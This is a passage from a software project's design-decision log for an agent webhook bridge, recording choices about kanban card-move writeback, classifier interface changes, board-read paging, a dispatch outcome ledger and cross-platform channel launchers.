  - **Splits failure by transience, inside the handler.** THROW (→ 5xx → redelivery) only for **transient / operator-fixable** conditions: a missing or insecure writeback token, an unconfigured API base URL, or a kanban **5xx / timeout / connection** error — these succeed on retry once fixed/recovered (the missing-token case mirrors the HMAC-secret fail-closed: kanban holds the event until the operator places the token). **LOG + NO-OP** (no throw, dispatch acks) for **permanent** conditions, which can never succeed and would 5xx-storm kanban-board's ~11-day retry curve if thrown: writeback disabled (no `writeback.json`), no mapping for the repo, no stage for the outcome, a **malformed payload** (a deterministic classifier bug), a kanban **4xx** on get/move (a deleted card, or a config'd stage that isn't on the card's board — kanban 404/422s these), or — the **security guard** — the card is **not on the mapped board** (belongs-to-mapped-board, DL-009). The dividing line is *retryability by HTTP status*: a kanban 4xx is the upstream saying "this will never work" (no-op); a 5xx/network error is "try again" (throw). This keeps the `DurableReaction` "failure → retry" contract honest: only retryable failures throw.
  - **Idempotent** (the marker's contract): a `getCard` showing the card already in the target stage is a no-op (no `moveCard`), so redelivery is safe.
  - **Config is authoritative; payload board/stage is ignored.** Board + stage come only from `writeback.json` keyed on the outcome; the belongs-to-board check compares the card's *real* `board_id` (from `getCard`) against the *mapped* board — a payload `board_id` can't influence it.
  - **Always-registered** (not opt-in like `spawn_detached`): it is **inert** without `writeback.json` + a token (it no-ops, never executes), and the classifier only emits the target for configured repos — so it carries none of `spawn_detached`'s RCE blast radius and needn't be gated.
- **Alternatives considered:**
  - **Throw on every failure (uniform durable treatment).** Rejected: a permanent failure (no mapping, card on the wrong board) would 5xx every redelivery forever — an infinite retry-storm into kanban-board's ~11-day retry curve. The transient/permanent split is the whole point.
  - **No-op on every failure (never throw).** Rejected: a transient kanban API error or a not-yet-placed token would then silently drop the move (the exact loss DL-009 built durability to prevent). Transient failures must retry.
  - **Gate the handler behind an opt-in flag (like `spawn_detached`).** Rejected: it's inert without config and bounded by config (no RCE), so the flag adds friction without safety; the `writeback.json` presence is the de-facto enable.
  - **Throw uniformly on any kanban API error (the first cut).** Rejected after review: a kanban **4xx** (deleted card, a config'd stage not on the card's board) is permanent — throwing it would 5xx-storm forever. The fix classifies by HTTP status (4xx → no-op, 5xx/network → throw); a non-existent stage/board id surfaces as a kanban 4xx and is correctly no-op'd, so load-time id validation stays unnecessary.
  - **Throw on a malformed payload (treat it like a bad ReactionTarget elsewhere).** Rejected: `HandlerException` is best-effort (ack 200) in every *other* handler, but this is the first `DurableReaction`, so the same throw 5xx-storms. A malformed payload is a deterministic classifier bug → log + no-op (the event can't be moved regardless — we don't know the card).
- **Consequences:** New `app/Bridge/Handlers/KanbanMoveCardHandler.php`, registered always-on in `HandlerRegistry` (now four always-on defaults). The bridge can now perform its first outward-facing write — but only when an operator has placed `writeback.json` + a least-privilege token, and only a card on the mapped board to a config-mapped stage. Unblocks phase 4 (the correlation classifier that emits the target + provisioning the GitHub webhook). Files: `app/Bridge/Handlers/KanbanMoveCardHandler.php`, `app/Bridge/Support/HandlerRegistry.php`, `docs/customization.md`, `tests/Feature/Handlers/{KanbanMoveCardHandlerTest,HandlerRegistryTest}.php`.

## DL-021 — `GitHubPrCardMoveClassifier` + correlation read + no-code GitHub provisioning (FR #2016, phase 4 — feature complete)

- **Date:** 2026-05-31
- **Context:** The final phase of FR #2016: the classifier that turns a `pull_request` webhook into a `kanban_move_card` target, wiring the durable handler (DL-020) to real GitHub events. Open questions: where correlation lives, and how the GitHub webhook gets provisioned.

  - **Build GitHub webhook provisioning into `bridge:provision`.** Rejected: it needs a repo-admin GitHub PAT the bridge deliberately doesn't hold; the repo-settings webhook is a one-time operator action, not worth the credential surface.
  - **Match the card by `pr_number` instead of `DL-NNN`.** Rejected for the *initial* correlation: a card has no `pr_number` until the first `opened` move sets it; `DL-NNN` (already the board convention) is present from the first event.

New `docs/writeback.md` runbook. **FR #2016 is feature-complete** (DL-009 design → DL-018 seam → DL-019 infra → DL-020 handler → DL-021 classifier). ## DL-022 — `Classifier::classify()` receives the serving `AgentConfig` (per-agent classification)

- **Date:** 2026-06-01
- **Context:** FR from a multi-agent operator: a classifier cannot make per-agent decisions because it isn't told which agent it serves. `Classifier::classify(eventType, payload, actor, provider, scopeId)` omits the agent; `ClassifierResolver` caches one instance per class (shared across agents), so the agent can only arrive as a call parameter, not instance state. `DispatchService` already loops per-agent and applies author-based gates (`isEcho`/`isSignal`) but has no recipient-aware seam. Concretely: a single install fanning out to N agents that share a coordination repo addressed with `to:<agent>` labels delivers every message to every agent — `backend` live-wakes on a `to:device` thread. Second time agent-blindness forced a work-around: DL-008 (channel auth) carries its per-agent Bearer token in `AgentConfig` + the handler precisely because the classifier couldn't be per-agent (its Context names this verbatim).
- **Decision:** Add the serving agent's **`AgentConfig`** as a required **final** parameter: `classify(eventType, payload, actor, provider, scopeId, AgentConfig $agent)`. The dispatcher passes `$agent` (already in hand at the per-agent loop, `DispatchService:113`). A classifier reads `$agent->agentName` / `$agent->identity` for recipient filtering (or any per-agent logic). Trailing position keeps the recognizable event-tuple readable (aesthetic only — see below). Concrete `AgentConfig` (not just `agentName`): already fully `readonly`, carries identity for author-vs-recipient logic, and avoids a second break if a classifier later needs more than the name. Instances stay shared/cached, so `$agent` is a call-local (docstring + `docs/customization.md` say so).
- **This is a BREAKING contract change, intentionally not "additive."** Verified empirically: PHP rejects an implementor whose `classify()` signature is narrower than the interface (`Declaration … must be compatible`), even with a default on the new param — so a default cannot soften it. Every implementor (3 in-tree + each operator's classifier) must add the parameter and thread it through any `parent::classify()`. Compile-checked (fatal-on-load makes a missed implementor impossible to ship silently); at this scale (pre-1.0, 3 in-tree, ~1 operator) the one-time mechanical update beats a permanent capability-interface or recipient-tagging indirection.
- **Supersedes DL-005's rejection of this option.** DL-005's "Alternatives considered" evaluated and **rejected** "pass `AgentConfig`/self-identity into `classify()`" as breaking and as "moving the echo decision into each classifier — contradicting the documented invariant." That calculus changed: DL-008 proved agent-blindness is a *recurring* forcing function, not a one-off, and recipient-addressing **policy** belongs in the operator's classifier anyway (the bridge supplies the mechanism — agent identity — not label semantics). DL-005's `reattributedActor` echo mechanism **stays**: for shared-identity *echo* you still report the author and let the dispatcher apply that agent's canonical echo rules (reuse, not reimplement). The two are orthogonal axes — recipient (this DL) vs author-echo (DL-005).
- **Alternatives considered:**
  - **Post-classify recipient-tagging hook** (classifier tags intents with recipients; dispatcher drops those not for the serving agent). Rejected: bakes recipient/label semantics into the bridge core, and the classifier still couldn't do *other* per-agent logic.
  - **Label-predicate subscription filtering** (`to:<self>` allowlist on the subscription). Rejected: needs per-agent label templating and pushes addressing policy into bridge config.
  - **Capability interface (`AgentAwareClassifier`) the dispatcher branches on.** Rejected: non-breaking but adds permanent two-shapes complexity + a dispatcher branch to dodge a one-time, compile-checked update — not worth it at this implementor count.
- **Consequences:** The contract now structurally depends on the config DTO (`Contracts\Classifier` → `Support\AgentConfig`; verified no cycle — `AgentConfig` references the default classifier only as a string). Custom classifiers must update (migration note in CHANGELOG + `docs/customization.md` § Per-agent classification). New acceptance test `tests/Feature/Dispatch/PerAgentClassifyTest.php` proves both halves: each agent's classify sees its own `$agent` through the shared instance (no leak), and a classifier filters by recipient. Files: `app/Bridge/Contracts/Classifier.php`, `app/Bridge/Dispatch/DispatchService.php`, `app/Bridge/Classifiers/{InboxOnlyClassifier,EventDrivenClassifier,GitHubPrCardMoveClassifier}.php`; docs `docs/customization.md`, `docs/multi-host.md`, `docs/multi-agent.md`; 7 test classifiers + 3 classifier tests updated.

## DL-025 — `Classifier::classify()` takes a single `ClassifyContext` (the LAST breaking signature change) + out-of-process pre-flight validation (#2053)

- **Date:** 2026-06-05
- **Context:** A custom classifier still on a prior positional `classify()` signature is an **uncatchable `E_COMPILE_ERROR`** ("Declaration must be compatible") the instant `ClassifierResolver` loads it — `try/catch(Throwable)` cannot catch it (verified PHP 8.3.6). Sola hit this in the v0.21 update window. Two harms: (a) the FPM worker dies mid-request → 500 → permanent retry-storm (config unchanged, recurs every redelivery); (b) `bridge:check`, the pre-flight that exists to catch exactly this, ALSO fatals (exit 255). The deeper cause: `classify()` is a **positional parameter list that keeps growing** — DL-002 added the provider-aware actor, DL-022 added the serving `$agent` — and every addition is an uncatchable break. Validating the bad signature is treating a symptom; the recurring break is the bug.
- **Decision (two parts):**
  - **A — parameter object (the root-cause fix).** `classify(ClassifyContext $ctx): ClassifyResult`, where `ClassifyContext` is a readonly DTO carrying eventType / payload / actor / provider / scopeId / agent. **Adding a field to `ClassifyContext` never changes the method signature**, so it can never again produce the compile-fatal. This is the **LAST breaking change** to `classify()`; future context needs are new DTO fields, not new params. Migrated the 3 in-tree classifiers + the dispatcher call site + 8 test fixtures.
  - **B — out-of-process pre-flight + SF-1.** `bridge:check` validates each classifier via `ClassifierResolver::probeLoadable()`, which loads the class in a **child php process** (Symfony Process, CLI `PHP_BINARY`); the child crashing on the compile fatal is fine — the parent reads its exit code and reports a clean, named failure instead of dying. SF-1: `ClassifierResolver::for()` wraps `new $class` to catch `\Error` (a ctor that requires args) → `ConfigException` (catchable → treatment-A, not a 500).
- **Consequences:** BREAKING for any custom classifier — it must migrate to the `ClassifyContext` signature — but it is the **last** such break (the whole point). Pre-1.0, acceptable; ~1–2 external classifiers. The **operator pre-flight is the primary defense**: `bridge:check` now survives + names the offending agent/class with a fix hint, so a stale classifier is caught before deploy. **Residual:** the *dispatch-time* uncatchable fatal isn't fully neutralized (a subprocess from FPM is unreliable — `PHP_BINARY` is `php-fpm` there), but once A is adopted, future param-equivalent additions are DTO fields → no fatal, and the pre-flight catches a transitional stale classifier. New `app/Bridge/Dispatch/ClassifyContext.php`; `ClassifierResolver::probeLoadable()`. Tests: `ClassifierResolverTest` (probe valid/missing/non-classifier + the SF-1 ctor wrap) + `CtorRequiringClassifier` fixture. 330/330, Pint + PHPStan L7 clean.

## DL-026 — Make degraded-but-not-erroring writeback states loud (blind/0-card token + page-cap truncation) (#2141)

- **Date:** 2026-06-06
- **Context:** Sola reported that the GitHub-PR → card-move writeback (FR #2016 / DL-021) **silently no-ops every move when its token can't see the board.** `KanbanClient::findCardByDlNumber`/`findCardByPrNumber` read the board via `GET /tasks/search.json?q=board_id=X&limit=200` and return `?int`. `null` conflated two very different causes: (1) a **genuine no-match** (N cards returned, none carry this PR's ref — a PR with no tracking card, correct to no-op quietly); (2) a **blind/degraded token** — the read returned **0 cards** because the token's user lost board membership (or `board_id`/instance is wrong). kanban answers `200` + empty `data`, so the existing `->throw()` never fires. Because the writeback is "machine-only, no agent in the loop," nobody is alerted — the board quietly stops advancing, looking identical to the healthy "no PR had a card" path. Two consequences (sibling audit): the classifier path **silently no-ops**; the `create_dependabot_cards` handler path is **worse** — a blind token makes it `createCard()` a **duplicate** on every redelivery (the DL-024 idempotency hole). The `limit=200` cap was likewise silent (a >200-card board misses correlations).
- **Decision:** extend the `->throw()`-loud-on-errors discipline to the two **non-erroring** degradations, in the **non-transient** register (NEVER a 5xx — a genuinely-blind board would retry-storm; a genuine no-match stays quiet):
  - **Runtime (catches post-deploy drift).** Both finders route through a shared `KanbanClient::correlationCards()` that `Log::warning`s once per read when the board returns **0 cards** (blind token) or **≥`SEARCH_LIMIT` (200)** cards (truncation). One choke-point covers both the classifier and the dependabot-handler sibling. A pure `searchBoardCards()` does the read (no logging); `boardCardCount()` exposes the count.
  - **Config-time (catches the persistent misconfig where it belongs).** `bridge:check` probes each mapped board with the writeback token (`boardCardCount`) and warns on 0 cards / cap / read-failure / factory-failure. **All warn-level — never fails the check** (a temporarily-unreachable kanban or a genuinely-empty new board must not fail an install check). The factory build is wrapped in `catch (\Throwable)` (an insecure-perms read throws a non-`ConfigException`) so the probe can never crash `bridge:check` — a #2053-class regression guard.
- **Alternatives considered:** (a) **surfaced intent** (handler → inbox) — the writeback path is reaction-only and the classifier deliberately emits no intents; plumbing a handler-emitted intent is the most invasive option and unnecessary once config-time + runtime warnings exist. Rejected. (b) **transient 5xx** — explicitly the wrong register (retry-storm). Rejected. (c) **hard-fail `bridge:check` on 0 cards** (the prior-art CI promoter `die`s on 0) — risks failing a legitimately-empty brand-new board; the CI promoter runs against a known-populated board, `bridge:check` runs at install time. Chose warn (flagged as a possible future tightening).
- **Consequences:** the blind-token and truncation states are now visible at both deploy time and runtime; the genuine-no-match path is unchanged (quiet, returns `null`). `KanbanClient` now logs — a deliberate deviation from the "thin client throws, caller logs" convention (no other `app/Bridge/Writeback` or `Adapters` class logs), justified because the shared read is the single point where the degradation is observable (docblock updated to say so). No schema/migration; opt-in posture unchanged (no `writeback.json` ⇒ unaffected). New: `KanbanClient::SEARCH_LIMIT`/`correlationCards`/`searchBoardCards`/`boardCardCount`, the `CheckCommand` board-visibility probe. Tests: 5 in `KanbanClientTest` (0-card warn + return null, dependabot-finder warn, 200-cap warn, genuine-no-match quiet, `boardCardCount`), 4 in `BridgeCommandsTest` (0-card warn, count info, read-failure warn, base-url-unset guard-lock with `assertNothingSent`) + hardened the existing missing-token test. **Residual:** actual paging past 200 is out of scope (warn is the floor). 340/340, Pint + PHPStan L7 clean.

## DL-027 — Per-mapping `swimlane_id` for writeback-CREATED cards (create-only, never on move) (#2148)

- **Date:** 2026-06-06
- **Context:** Sola requested (required FR) that the writeback be able to place created cards in a specific swimlane — the concrete case being one board shared across repos with a lane per repo, where every dependabot/PR-origin card a mapping creates should land in that repo's lane instead of the board's default. Today `KanbanClient::createCard()` (the only create path, reached by the DL-024 dependabot handler) posts no `swimlane_id`, so kanban assigns the default lane.
- **Decision:** add an **optional** `swimlane_id` to each `writeback.json` mapping (`WritebackMapping::$swimlaneId`, nullable, trailing ctor param). It is applied **at card CREATE only — never on a move.** A move stays a column-only `workflow_stage_id` PATCH (DL-020), so a human re-laning a card is preserved and a webhook redelivery can't yank a card back to its origin lane. `KanbanClient::createCard()` gains a trailing `?int $swimlaneId` and adds `task.swimlane_id` to the POST **only when non-null** (absent ⇒ omit the key ⇒ default lane, byte-for-byte today's request). Parsing is **strict like `board_id`/`stages`, NOT the `identity_id` silent-null pattern**: a present non-numeric `swimlane_id` **throws** `ConfigException` (fail-closed) rather than dropping to the default lane — silently landing cards in the wrong lane is exactly the fail-quiet trap DL-026 fought. `bridge:check` validates a pinned `swimlane_id` against the board's actual lanes (new `KanbanClient::boardSwimlaneIds()` via the lightweight `GET /boards/{id}/preload.json` — carries swimlanes, not every task, unlike `GET /boards/{id}.json`) and **warns** (never fails) that created cards would `422`-and-silently-no-op when the lane is missing (deleted, or on a different board).
- **Alternatives considered:** (a) **swimlane on move too** — rejected: moves are deliberately column-only; re-laning on every PR event would fight human organization and make redelivery non-idempotent w.r.t. lane. (b) **silent-null on bad value** (the `identity_id` precedent) — rejected per DL-026: a wrong-lane card is invisible-degraded, the class of bug we just made loud. (c) **read lanes via `GET /boards/{id}.json`** — rejected: that endpoint is task-heavy; `preload.json` returns the lanes alone (M1 review fix). (d) **validate the lane at runtime in the handler** — unnecessary: config-time `bridge:check` catches the misconfig where it belongs, and a runtime 422 is already the permanent-refusal (log + no-op) branch.
- **Consequences:** opt-in and backward-compatible — every existing `writeback.json` (no `swimlane_id`) produces byte-identical POSTs; no schema/migration. Only the dependabot create path exercises it today (a DL-correlated card is created by the board's own automation, not the writeback). New surface: `WritebackMapping::$swimlaneId`, `KanbanClient::createCard($swimlaneId)` + `boardSwimlaneIds()`, the `CheckCommand` lane probe. Tests: 2 in `WritebackConfigTest` (loads optional id, non-numeric throws), 3 in `KanbanClientTest` (create with/without lane, `boardSwimlaneIds` reads preload), 2 in `KanbanDependabotCardHandlerTest` (lane reaches/omitted from the create POST), 2 in `BridgeCommandsTest` (lane-ok info, lane-missing warn). 349/349, Pint + PHPStan L7 clean. **Note (S1):** `boardSwimlaneIds` is bridge:check-only — runtime trusts config + kanban's 422, no extra per-create read. **Note (N1):** only the bot/dependabot create path creates cards, so the lane affects only those today; a future non-dependabot writeback-create would inherit it for free.

## DL-028 — Page the writeback correlation read (close the DL-026 >200-card truncation residual) (#2151)

- **Date:** 2026-06-06
- **Context:** Sola hit this standing up `create_dependabot_cards` (DL-024) on a **mature board (~300 live cards)**: `bridge:check` correctly fired the DL-026 cap warning, but the warning was the *only* mitigation. `KanbanClient` read a board in **one** capped request (`GET /tasks/search.json?q=board_id=N&limit=200`); kanban hard-caps a single search response at 200 rows regardless of `limit` (verified in source: `min(200, …)` + `forPage($page,$perPage)` over an `id`-desc total order). So on a board past 200 live cards, any card beyond #200 was **invisible** to `findCardByDlNumber`/`findCardByPrNumber` → a move silently no-ops (DL-021), and worse, the DL-024 create path read "not found" as "no card exists" and **minted a duplicate on every redelivery** — the same idempotency hole DL-026 closed for the *blind-token* case, reproduced for the *truncation* case. Released/terminal cards accumulate, so any long-lived tracking board crosses 200 and stays there. DL-026 explicitly deferred actual paging ("warn is the floor").
- **Decision:** make the shared board read **page until a short page**. The search body is a bare `{data:[...]}` (no `total`/`meta`/`links`), so the stop condition is "keep incrementing `?page` while a page returns exactly `SEARCH_LIMIT` rows; stop on the first page that returns fewer." A hard `MAX_PAGES` ceiling (50 → 10,000 live cards) bounds a pathological/non-paging upstream. The read stays **eager-full** (read all pages, then iterate to match) because the degraded-state guards need the whole result and a page-1 match on a 300-card board is still only 2 GETs. **Crucially** (the plan-review must-fix): the short-page break and the truncation decision are made **inside the loop on the RAW batch length** (rows kanban returned), surfaced as an explicit `BoardRead{cards, truncated}` value object — **not** re-derived downstream from `count($cards)`. The rows are array-filtered (a non-array row is dropped), so a count-based check would desync and miss truncation at the boundary — the read-time-reconstruction anti-pattern and precisely the silent-loss class DL-026 exists to kill. DL-026's separation is preserved: `readBoard()` is **pure (no logging)** and merely *reports* what it observed (the `truncated` flag); `correlationCards()` still owns the runtime `Log::warning`s (0-card blind-token guard on empty; truncation guard on the flag) and `bridge:check` prints its own line. The old `bridge:check` "200-card cap; paging needed" warning is replaced by an "exceeds the 10,000-card safety ceiling" warning gated on the flag; the normal branch now reports the **true paged count**.
- **Alternatives considered:** (a) **lazy page-by-page, stop when matched** — rejected: it can't compute the 0-card/truncation guards (which need the full read) and saves nothing at real board sizes (1–2 pages). (b) **derive truncation from `count($cards) >= SEARCH_LIMIT*MAX_PAGES`** — rejected (plan-review must-fix): array-filtered count desyncs from raw page sizes → false-negative truncation at the boundary, the COALESCE-at-read-time smell (canon #5). (c) **per-run memoization of the board read** — rejected as dead complexity: `WritebackClientFactory::make()` returns a fresh client per call and no handler calls both finders, so no board is read twice in one request today; revisit if a future caller does N correlations on one client. (d) **dedup-guard a non-paging upstream** (page N == page N-1) — rejected as over-engineering for a server we control; documented as the one assumption the truncation flag makes (kanban honors `page`).
- **Consequences:** boards >200 go from silently-truncated to fully-correlated; ≤200-card boards are behaviorally identical (page 1 short ⇒ one GET, as before). No config/schema/migration; internal read-loop only. New surface: `KanbanClient::MAX_PAGES`, `readBoard()` (replaces `searchBoardCards`), `boardVisibility(): BoardRead` (replaces `boardCardCount(): int`), the `BoardRead` value object. Tests: 4 new in `KanbanClientTest` (multi-page find beyond #200, MAX_PAGES ceiling warning + `assertSentCount`, raw-length-not-filtered-count break lock, `boardVisibility` shape) + the obsolete 200-cap test removed; 1 new in `BridgeCommandsTest` (ceiling warning). 352/352, Pint + PHPStan L7 clean. **Cost:** each correlation now costs ≈ ⌈live-cards ÷ 200⌉ GETs (eager-full, no memoization) — negligible at real sizes, bounded at 50 by the ceiling. **Residual:** a board **at or past** 10,000 live cards is reported truncated (loudly) — at exactly 10,000 that's a conservative false-positive warning, since distinguishing "exactly full" from "more beyond" would cost an extra page request; prune terminal cards or raise `MAX_PAGES`.

## DL-036 — Dispatch outcome ledger: `outcome` + `reason` on `agent_dispatches` distinguishes delivered / gate-dropped / errored (operator FR-2)

- **Date:** 2026-06-07
- **Context:** The per-agent dispatch ledger recorded only two observable states: `processed_at` set (terminal) and `error_message` set (errored, replayable). But a **deliberate gate-drop** (echo of the agent's own write, actor not a signal, or the classifier emitting no reactions) and a **successful delivery** both end with `processed_at` set and `error_message` null — so `bridge:inspect` rendered them identically as "done", and an operator debugging "why didn't my agent react to event N?" had no recorded answer (dropped-on-purpose vs delivered-but-handler-noop are indistinguishable). Worse, `bridge:replay` without `--force` skips every row with `processed_at` set — *including gate-dropped ones* — so a replay after fixing a classifier/gate bug would **silently no-op for exactly the rows you wanted to re-run**, with no hint why. The ledger lost the one fact the operator needed: *what did the bridge decide, and why.*
- **Decision:** add two nullable columns to `agent_dispatches` — `outcome` (string(16): `delivered` | `dropped` | `errored`, the `AgentDispatch::OUTCOME_*` vocabulary) and `reason` (string(255), the human-readable why). `DispatchService` stamps the specific terminal at each exit: `markDelivered($note)` (classifier emitted reactions → intents/handlers ran), `markDropped($reason)` at each gate (`echo: own write` / `echo: own write (reattributed author)` / `actor is not a signal` / `classifier emitted no reactions`), and `recordError` now also sets `outcome=errored`. Both columns are **nullable with no backfill** — pre-DL-036 rows read `outcome=null`, and every reader falls back to the legacy `processed_at`/`error_message` inference (`bridge:inspect` shows `done (pre-DL036)`), so the migration is non-destructive and needs no data migration. `bridge:replay` without `--force` now reports `skipping N already-processed dispatch row(s) — M were gate-DROPPED (recoverable after a gate fix); pass --force to re-run them`, turning the silent no-op into an actionable message.
- **Alternatives considered:** (a) **infer outcome at read-time** from `processed_at`/`error_message` (no schema change) — rejected: there's no stored signal that separates a deliberate drop from a handler-noop delivery, so the inference can't be made; the fact has to be *recorded at decision-time* (canon: don't add a read-time fallback for data the write-site should persist). (b) a **separate `dropped_at`/`drop_reason` pair** — rejected: a dispatch has exactly one terminal outcome, so one `outcome` enum + one `reason` is the honest shape (three timestamp columns would imply states that can't co-occur). (c) **a boolean `was_dropped`** — rejected: it can't express `errored`, and `reason` carries the *which-gate* detail an operator actually debugs with. (d) **a non-nullable column with a backfill** — rejected: pre-existing rows have no recoverable outcome (the distinction was never recorded), so an honest `null` (= "decided before DL-036") beats a guessed backfill.
- **Consequences:** new idempotent migration `2026_06_07_000001_add_outcome_to_agent_dispatches` (`Schema::hasColumn` guards; reversible `down()`); `AgentDispatch` gains the `OUTCOME_*` constants + `outcome`/`reason` in `$fillable`; `DispatchService` splits the former single `markDone` into `markDelivered`/`markDropped` (+ `Log::info` per outcome) and the echo/non-signal drops into distinct reasons; `bridge:inspect` renders an `outcome` column + `reason / error`; `bridge:replay` reports the gate-dropped skip count. 8 new `DispatchServiceTest` outcome cases (incl. a `--force`-replay outcome *transition* that pins the satellite fields mutually exclusive — each `mark*` writes the full terminal tuple, nulling the inapplicable field, so a `dropped`→`delivered` re-run can't leave a stale reason that `bridge:inspect` would show next to a `delivered` outcome) + 2 `BridgeCommandsTest` cases (inspect-shows-outcome, replay-skip-report). Pint clean · PHPStan L7 0 · PHPUnit 395/395. No config change; opt-in nothing — the ledger is always-on.

## DL-155 — Correction to DL-154: the launcher SURFACES the `.FAILED` marker, it does not silently clear it (#2444 follow-on)

- **Date:** 2026-06-13
- **Correcting:** DL-154's launcher clause ("Also clears a stale marker on (re)start") and its connector clause ("persists … until the next successful bind **or a launcher (re)start**"). DL-154 itself remains frozen; this entry supersedes those two phrases.
- **Context (gap):** DL-154 designed the `<socket>.FAILED` marker to be **fail-loud-until-acknowledged**, but made `start-channel-session.sh` `rm -f "${SOCK}.FAILED"` *before* binding — a **silent** clear. So the one moment the operator returns to relaunch a session that previously came up deaf, the durable signal is wiped without ever being shown. The acknowledgment DL-154 intended was real, but **uninformed** — which defeats the marker's whole purpose (a customer FR, board-8 #2456, surfaced it). The launcher clear was also redundant: the connector already clears the marker unconditionally on a successful bind (`agent-webhook-bridge-channel.mjs` `server.listen` callback → `clearFailureMarker()`), and a launch always triggers a bind attempt.
- **Decision:** the launcher **surfaces** the marker loudly to stderr at launch (the prior deaf-session's timestamp + pid + reason) and does **not** clear it. The **connector is the sole clearer**, on the next successful bind (which the launch triggers moments later) — so a clean relaunch still ends with no marker, but a relaunch whose new session *also* comes up deaf correctly leaves a fresh marker. Net: the marker now persists until the next *successful bind*, full stop; launcher-restart becomes a **surface point, not a clear point**. Single owner for the clear (the connector), aligned with DL-154's own "cleanup owner = current holder."
- **Why not keep a launcher clear (even loud):** no second clearer is needed — the connector already owns it on bind, and a launcher clear can only ever race ahead of the bind it's redundant with. Surface-only is strictly less code and removes the silent-wipe footgun.
- **Out of scope (held):** the FR's heavier Part C (fork + post-launch verify-then-kill) and a standalone `bridge:doctor` stay descoped exactly as DL-154 ruled (canon #6) — no recurrence evidence to reopen them.
- **Consequences:** `examples/start-channel-session.sh` (replace the `rm -f` with a surface-if-present block), `examples/channel-servers/README.md` lifecycle note (launcher surfaces, not clears). The deployed `~/start-claude.sh` gets the same operational sync. No connector/`bridge:check`/app code change — the connector's clear-on-bind already does the right thing. Behavior change is operator-facing stderr only; no schema/migration/`.env`/API change. ## DL-156 — `bridge:check` is HTTP-transport-aware: liveness-probe the loopback/tunnel port + surface the HTTP `.FAILED` marker; channel-server marker base is `os.tmpdir()` (Windows-correct) (Sola PM FR-2)

- **Date:** 2026-06-13
- **Context (gap):** DL-154/155 made a deaf/duplicate channel connector visible — but only for the **UDS** transport. `bridge:check` derived both the `.FAILED` marker path and the liveness ping from `channel.socket` (`CheckCommand.php`: `$marker = channel.socket.'.FAILED'`; `stream_socket_client('unix://…')`). An **HTTP-transport** agent (the multi-host / SSH-reverse-tunnel topology — a peer integrator's *most common* shape) carries `channel.url`, not `channel.socket`, so `bridge:check` could neither probe liveness nor surface the marker. The deaf-session signal was invisible at preflight for exactly the bind-race-prone (remote, tunneled) agents. Separately, the channel server's `markerPath()` HTTP branch fell back to a literal `'/tmp'` when `XDG_RUNTIME_DIR` is unset — which under Node on **Windows** resolves to `C:\tmp`, never matching the Windows launcher's `%TEMP%` lookup, so the marker was unfindable there.
- **Decision:**
  - **`bridge:check` HTTP branch** (when `channel.url` set, no `socket`): parse `host:port` from the URL and run the liveness probe as a **TCP connect to `host:port`** (warn/info, never fails — DL-154 posture). This is the meaningful **cross-host** check: `bridge:check` runs on the receiver host, and a connect to the loopback endpoint travels the reverse tunnel to the remote connector. Also surface the HTTP marker **best-effort** (`$XDG_RUNTIME_DIR` else `/tmp`-equiv `/agent-webhook-bridge-channel-<name>.http-<port>.FAILED`, keyed on the agent name as the `BRIDGE_CHANNEL_NAME` proxy) — only meaningful when `bridge:check` runs **on the agent host**, since the marker file lives where the connector runs.
  - **Marker surfacing on the agent host is the launcher's job** (FR-1), which knows `BRIDGE_CHANNEL_NAME`/port exactly; `bridge:check`'s primary HTTP value is the liveness probe.
  - **Channel server `markerPath()`**: `XDG_RUNTIME_DIR || '/tmp'` → `XDG_RUNTIME_DIR || os.tmpdir()` so the base is `%TEMP%` on Windows (matching the Windows launcher) and unchanged (`/tmp`/`$TMPDIR`) on Linux/macOS. `examples/channel-servers/` example → **0.4.2** (DL-038 drift signal).
- **Topology caveat (why marker surfacing isn't symmetric with UDS):** in the tunnel topology the full bridge (and `artisan bridge:check`) runs only on the receiver host; the remote agents run just the channel server + Claude Code. So the remote HTTP marker is unreachable from `bridge:check` — the launcher on the agent host owns its surfacing. The liveness probe is the cross-host-meaningful half and is the symmetric win.
- **Consequences:** `app/Console/Commands/Bridge/CheckCommand.php` (HTTP branch: liveness TCP probe + best-effort marker), `examples/channel-servers/agent-webhook-bridge-channel.mjs` (`os.tmpdir()` fallback + comment), `examples/channel-servers/package.json` (0.4.2), `docs/config-schema.md` (`channel.url` row). Tests: `BridgeCommandsTest` +3 (HTTP live / not-answering / HTTP marker surfaced). Warn/info only — no receiver/handler/schema/migration/`.env` change. Pairs with DL-157 (canonical cross-platform launcher).

## DL-157 — Canonical self-resolving, transport-aware, cross-platform channel launcher (Sola PM FR-1)

- **Date:** 2026-06-13
- **Context (gap):** the shipped launcher was bash + UDS-only, so every consumer hand-rolled a per-OS/per-transport copy that froze at its install version and drifted (launchers found several minor versions stale, missing the v0.32/v0.33 guards). The DL-154/155 deaf-session guards didn't apply on HTTP (no socket file) or Windows (no `pgrep`/`sed`), and force-fitting the bash onto Windows/HTTP silently broke live-wake. A peer integrator (Sola PM) — whose multi-agent, multi-host (HTTP-over-SSH-tunnel) + Windows topology is the most common real-world shape — supplied validated reference launchers; this folds them into the canonical examples.
- **Decision — one self-resolving launcher per OS, sharing the same identity chain + guards:**
  - `examples/start-channel-session.sh` (Linux UDS+HTTP) + `examples/start-claude.ps1` + `examples/start-claude.bat` (Windows HTTP-tunnel).
  - **Self-resolving identity** (first hit): `--channel` → `$BRIDGE_CHANNEL_NAME` → `settings.local.json` `.env.BRIDGE_CHANNEL_NAME` → `<namespace>-<agent>` from `$COORD_CONFIG.bridge.channel_namespace` + `$COORD_AGENT`. **`settings.local.json` is load-bearing:** the launcher runs in the login shell, which doesn't inherit Claude Code's session-injected env — relying on exported env alone is the #1 "can't resolve channel" failure, so the keys are read from the file (jq / `ConvertFrom-Json`). One launcher serves any agent → kills the per-agent-copy drift.
  - **Transport-aware guards:** UDS — socket-curl stale check + stale-socket rm + `pgrep` single-session; HTTP — TCP-port listener probe + process-table/listening-port single-session. DL-154/155 marker surfacing (never clear) rendered for both, with the transport-correct marker path.
  - **Export the resolved identity before `exec`** (`BRIDGE_CHANNEL_NAME`/`TRANSPORT`/`PORT`, and `SOCKET` for UDS): the channel server otherwise re-derives its endpoint independently from `~/.mcp.json`, and a divergence guards one path while the server binds another — a deaf-session footgun. Exporting guarantees the server binds exactly what the launcher guarded. (Added on top of Sola's reference, which resolved+guarded but didn't export.)
  - **Vocabulary fix:** the server reads `BRIDGE_CHANNEL_TRANSPORT` and branches on `=== 'unix'`; the launcher normalizes `''`/`uds`/`unix` → `unix` (and validates) so exporting it can't push the server into the wrong branch.
